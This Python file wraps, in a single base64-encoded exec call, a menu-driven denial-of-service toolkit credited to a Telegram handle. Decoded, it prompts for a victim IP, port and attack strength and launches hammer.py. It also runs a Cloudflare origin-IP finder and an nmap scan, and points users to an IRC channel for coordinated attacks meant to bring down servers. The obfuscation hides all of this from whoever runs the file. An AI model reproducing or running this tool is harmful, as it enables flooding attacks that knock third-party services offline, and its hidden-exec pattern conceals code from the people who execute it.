import base64
exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIEJhY2ssIFN0eWxlCgpkZWYgY2xzKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZT09J250JyBlbHNlICdjbGVhcicpCgpjbHMoKQpwcmludChGb3JlLkdSRUVOICsgIiIpCgpwcmludCgiIF9fX18gICAgICAgX19fXyAgICAgICBfX19fXyAgICAgICBfX19fICAgICAiKQpwcmludCgiL1wgIF9gXCAgICAvXCAgX2BcICAgIC9cICBfX2BcICAgIC9cICBfYFwgICAgICIpCnByaW50KCJcIFwgXC9cIFwgIFwgXCBcL1wgXCAgXCBcIFwvXCBcICAgXCBcLFxMXF9cICIpCnByaW50KCIgXCBcIFwgXCBcICBcIFwgXCBcIFwgIFwgXCBcIFwgXCAgIFwvX1xfXyBcICIpCnByaW50KCIgIFwgXCBcX1wgXCAgXCBcIFxfXCBcICBcIFwgXF9cIFwgICAgL1wgXExcIFwgIikKcHJpbnQoIiAgIFwgXF9fX18vICAgXCBcX19fXy8gICBcIFxfX19fX1wgICBcIGBcX19fX1wgIikKcHJpbnQoIiAgICBcL19fXy8gICAgIFwvX19fLyAgICAgXC9fX19fXy8gICAgXC9fX19fXy8gIikgICAKcHJpbnQoIiAiKQpwcmludChGb3JlLkNZQU4gKyAiIGJ5IEB3YW5uYWRlYXV0aCB8IEB3YW5uYWRlYXV0aF9jaGF0ICh0ZWxlZ3JhbSkiKQpwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCnByaW50KCIgIikgICAKcHJpbnQoRm9yZS5ZRUxMT1cgKyAgIiBbMV0gU3RhcnQgYXR0YWNrIHwg0J3QsNGH0LDRgtGMINCw0YLQsNC60YMiKQpwcmludChGb3JlLldISVRFICsgIiIpCnByaW50KCIgWzJdINCj0LfQvdCw0YLRjCDQsNC50L/QuCDQtNC+0LzQtdC90LAsIGNsb3VkZmxhcmUgY3JhY2tlciBkb21lbnMgaXAiKQpwcmludChGb3JlLlJFRCArICIiKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnByaW50KCIgWzNdINCh0LrQsNC90LjRgNC+0LLQsNGC0Ywg0L/QvtGA0YLRiyB8IFNjYW4gb3BlbiBwb3J0cyIpCnByaW50KEZvcmUuQkxVRSArICIgIikgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCnByaW50KCIgWzRdINCn0LDRgiDRgSBEb1Mt0LXRgNCw0LzQuCDQv9GA0Y/QvNC+INC90LUg0LLRi9GF0L7QtNGPINC40LcgVGVybXV4LCDQstGLINC80L7QttC10YLQtSDQtNC10LnRgdGC0LLQvtCy0LDRgtGMINGB0LvQsNC20LXQvdC90L4iKQpwcmludCgiICAgICDRh9GC0L7QsdGLINC/0L7QstCw0LvQuNGC0Ywg0YHQuNC70YzQvdGL0Lkg0YHQtdGA0LLQtdGAIHwiKQpwcmludCgiICAgIikKcHJpbnQoIiAgICB8ICBDaGF0IHdpdGggb3RoZXIgYXR0YWNrZXJzIHdpdGhvdXQgbGVhdmluZyBUZXJtdXgsIHlvdSBjYW4gYXR0YWNrIHRvZ2V0aGVyLCIpCnByaW50KCIgICAgIHRvIGJyaW5nIGRvd24gYSBzdHJvbmcgc2VydmVyLiIpCnByaW50KEZvcmUuR1JFRU4gKyAiIikKYSA9IGlucHV0KCIgV3JpdGUgcGFyYW1ldHIgfCDQktCy0LXQtNC40YLQtSDQv9Cw0YDQsNC80LXRgtGAIDogIikKICAgICAgICAgICAgICAgICAgICAgIAoKaWYgYSA9PSAiMSI6CiAgICBpcCA9IGlucHV0KCLQktCy0LXQtNC40YLQtSBpcCDQsNC00YDQtdGBINC20LXRgNGC0LLRiyB8IFR5cGUgaXAgYWRyZXNzIG9mIHZpY3RpbTogIikKICAgIHBvcnQgPSBpbnB1dCgi0JLQstC10LTQuNGC0LUg0L/QvtGA0YIgfCBQb3J0OiAiKQogICAgc3Ryb25nID0gaW5wdXQoItCa0L7Quy3QstC+INC/0L7RgtC+0LrQvtCyICjRgdC40LvQsCkgfCBDdXJyZW50L3N0cm9uZyBvZiBhdHRhY2sgXG4g0JbQtdC70LDRgtC10LvRjNC90L4g0L7RgiAxNTAg0LTQviA3MDAgfCBQcmVmZXJhYmx5IGluIHJhbmdlIG9mIDE1MCA3MDA6ICIpCgogICAgbGlzdF9maWxlcyA9IHN1YnByb2Nlc3MucnVuKFsicHl0aG9uIiwgImhhbW1lci5weSIgLCItcyIgICwgaXAgLCAiLXAiICwgcG9ydCAsICItdCIgLCBzdHJvbmddKQoKCmVsaWYgYSA9PSAiMiI6CiAgICBsaXN0X2ZpbGVzID0gc3VicHJvY2Vzcy5ydW4oWyJweXRob24iLCAiY2xvdWRfa2lsbGVyLnB5Il0pCgplbGlmIGEgPT0gIjMiOgogICAgaXAxID0gaW5wdXQoItCS0LLQtdC00LjRgtC1IGlwINCw0LTRgNC10YEg0LTQu9GPINGB0LrQsNC90LjRgNC+0LLQsNC90LjRjyB8IFR5cGUgaXAgZm9yIHNjYW5uaW5nIHBvcnRzOiAiKQogICAgcG9ydDEgPSBpbnB1dCgi0JLQstC10LTQuNGC0LUg0L/QvtGA0YLRiyB8IFdyaXRlIHBvcnRzIFxuINCf0YDQuNC80LXRgCB8IEV4YW1wbGUgMjEtODAsNDQzLDc3NzcsODA4MDogIikKICAgIGxpc3RfZmlsZXMgPSBzdWJwcm9jZXNzLnJ1bihbIm5tYXAiICwgIi1zViIgLCBpcDEgLCAiLXAiICwgcG9ydDFdKQoKZWxpZiBhID09ICI0IjoKICAgIGNscygpCiAgICBwcmludChGb3JlLkdSRUVOICsgIiIpCgogICAgcHJpbnQoIiBfX19fICAgICAgIF9fX18gICAgICAgX19fX18gICAgICAgX19fXyAgICAgIikKICAgIHByaW50KCIvXCAgX2BcICAgIC9cICBfYFwgICAgL1wgIF9fYFwgICAgL1wgIF9gXCAgICAgIikKICAgIHByaW50KCJcIFwgXC9cIFwgIFwgXCBcL1wgXCAgXCBcIFwvXCBcICAgXCBcLFxMXF9cICIpCiAgICBwcmludCgiIFwgXCBcIFwgXCAgXCBcIFwgXCBcICBcIFwgXCBcIFwgICBcL19cX18gXCAiKQogICAgcHJpbnQoIiAgXCBcIFxfXCBcICBcIFwgXF9cIFwgIFwgXCBcX1wgXCAgICAvXCBcTFwgXCAiKQogICAgcHJpbnQoIiAgIFwgXF9fX18vICAgXCBcX19fXy8gICBcIFxfX19fX1wgICBcIGBcX19fX1wgIikKICAgIHByaW50KCIgICAgXC9fX18vICAgICBcL19fXy8gICAgIFwvX19fX18vICAgIFwvX19fX18vICIpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHByaW50KCIgIikKICAgIHByaW50KEZvcmUuQ1lBTiArICIgYnkgQHdhbm5hZGVhdXRoIHwgQHdhbm5hZGVhdXRoX2NoYXQgKHRlbGVncmFtKSIpCiAgICBwcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCiAgICBwcmludChGb3JlLldISVRFICsgIiAiKQogICAgcHJpbnQoIiAg0JIg0L7RgtC60YDRi9Cy0YjQtdC80YHRjyDQvtC60L3QtSwg0L/QvtGB0LvQtSBJcnNzaSwg0L/QuNGI0LXQvCDRgtCw0LrQuNC1INC60L7QvNCw0L3QtNGLOiAiKQogICAgcHJpbnQoRm9yZS5SRUQgKyAiICIpCiAgICBwcmludCgiICAgICAvY29ubmVjdCBjaGF0LmZyZWVub2RlLmNvbSIpIAogICAgcHJpbnQoIiAgICIpCiAgICBwcmludCgiICAgICAvam9pbiBkb3NlciIpCiAgICBwcmludChGb3JlLldISVRFICsgIiAiKQogICAgcHJpbnQoItCS0YHQtSEg0JLRiyDQsiDRh9Cw0YLQtSEhISIpCiAgICBwcmludCgiICIpCiAgICBwcmludChGb3JlLllFTExPVyArICIgIikKCiAgICBwcmludCgiIFsxXSBJcnNzaSIpCiAgICBwcmludCgiICIpCiAgICBwcmludCgiIFsyXSDQo9GB0YLQsNC90L7QstC40YLRjCDQvNC+0LTRg9C70YwgSXJzc2kiKQogICAgcHJpbnQoIiAiKQogICAgcHJpbnQoRm9yZS5HUkVFTiArICIgIikKICAgIGIgPSBpbnB1dCgi0JLRi9Cx0LXRgNC40YLQtSDQtNC10LnRgdGC0LLQuNC1OiAiKQogICAgaWYgYiA9PSAiMiI6CgogICAgICAgIGxpc3RfZmlsZXMgPSBzdWJwcm9jZXNzLnJ1bihbImFwdC1nZXQiICwgImluc3RhbGwiICwgImlyc3NpIl0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICBpZiBiID09ICIxIjoKICAgICAgICBsaXN0X2ZpbGVzID0gc3VicHJvY2Vzcy5ydW4oWyJpcnNzaSJdKQoKZWxzZToKICAgIHByaW50KCLQl9Cw0LTQsNC90LAg0L3QtdCy0LXRgNC90LDRjyDRhNGD0L3QutGG0LjRjyB8IFdyb25nIGZ1Y3Rpb24gaGFzIGJlZW4gc2V0dXAiKQoKCgoKCgo='))